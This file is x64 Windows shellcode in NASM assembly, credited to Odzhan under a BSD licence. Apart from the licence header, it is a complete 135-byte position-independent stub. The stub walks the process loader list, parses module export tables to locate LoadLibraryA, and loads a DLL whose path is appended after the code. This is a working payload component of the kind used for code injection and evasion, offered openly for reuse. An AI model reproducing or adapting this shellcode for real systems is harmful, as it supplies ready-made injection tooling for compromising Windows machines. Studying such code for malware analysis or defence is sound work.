;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;

; 135 byte LoadLibrary shellcode for x64 windows
; Uses the Export Address Table
; odzhan

      %include "include.inc"
      
      bits   64

      pushx  rsi, rdi, rbx, rbp
      sub    rsp, 28h
      push   TEB.ProcessEnvironmentBlock
      pop    r11
      mov    rax, [gs:r11]
      mov    rax, [rax+PEB.Ldr]
      mov    rdi, [rax+PEB_LDR_DATA.InLoadOrderModuleList + LIST_ENTRY.Flink]
      jmp    scan_dll
next_dll:    
      mov    rdi, [rdi+LDR_DATA_TABLE_ENTRY.InLoadOrderLinks + LIST_ENTRY.Flink]
scan_dll:
      mov    rbx, [rdi+LDR_DATA_TABLE_ENTRY.DllBase]
      test   rbx, rbx
      jz     exit_load
      
      mov    eax, [rbx+IMAGE_DOS_HEADER.e_lfanew]
      add    eax, r11d
      mov    ecx, [rbx+rax+IMAGE_NT_HEADERS.OptionalHeader + \
                           IMAGE_OPTIONAL_HEADER.DataDirectory + \
                           IMAGE_DIRECTORY_ENTRY_EXPORT * IMAGE_DATA_DIRECTORY_size + \
                           IMAGE_DATA_DIRECTORY.VirtualAddress - \
                           TEB.ProcessEnvironmentBlock]
      jecxz  next_dll
      lea    rsi, [rbx+rcx+IMAGE_EXPORT_DIRECTORY.NumberOfNames]
      lodsd
      xchg   eax, ecx
      jecxz  next_dll                  ; skip if no names
      ; rdx = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions     
      lodsd
      xchg   eax, edx
      add    rdx, rbx                  ; rax = RVA2VA(rdx, rbx)
      ; rbp = IMAGE_EXPORT_DIRECTORY.AddressOfNames
      lodsd
      xchg   eax, ebp
      add    rbp, rbx                  ; rbp = RVA2VA(rbp, rbx)
      ; rax = IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
      lodsd
      xchg   eax, esi
      add    rsi, rbx                  ; rsi = RVA(rax, rbx)
find_api:
      mov    eax, [rbp+rcx*4-4]        ; eax = RVA of API string
      cmp    dword[rax+rbx], 'Load'
      loopne find_api                  ; --ecx && Load not found
      jecxz  next_dll
      cmp    dword[rax+rbx+8], 'aryA'
      jne    find_api                  ; get next DLL    
      movzx  eax, word[rsi+rcx*2]      ; eax = AddressOfNameOrdinals[eax]
      mov    ecx, [rdx+rax*4]          ; ecx = base + AddressOfFunctions[eax]
      add    rbx, rcx
      jmp    load_dll
init_dll:
      pop    rcx
      call   rbx
exit_load:
      add    rsp, 28h
      popx   rsi, rdi, rbx, rbp
      ret      
load_dll:
      call   init_dll      
      ; dll path goes here 
      